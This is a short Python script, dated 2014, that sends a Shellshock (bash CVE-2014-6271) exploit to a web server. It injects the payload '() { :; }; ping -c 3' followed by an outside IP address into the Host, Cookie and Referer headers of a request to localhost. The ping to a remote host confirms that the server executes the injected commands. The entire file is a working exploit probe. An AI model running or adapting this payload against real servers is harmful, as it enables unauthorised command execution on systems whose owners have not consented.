# !/usr/bin/env python
#-*- coding: utf-8 -*-
#=============================================================================
#     FileName: reb.py
#         Desc:
#       Author: 苦咖啡
#        Email: voilet@qq.com
#     HomePage: http://blog.kukafei520.net
#      Version: 0.0.1
#   LastChange: 2014-09-25
#      History:
#=============================================================================
import requests

s = "http://localhost/"
headers = {
            "host": "() { :; }; ping -c 3 209.126.230.74",
            "cookie": "() { :; }; ping -c 3 209.126.230.74",
            "referer": "() { :; }; ping -c 3 209.126.230.74",
            "user-agent": "wapiti",
          }

rst = requests.get(s, headers=headers)
print rst.status_code
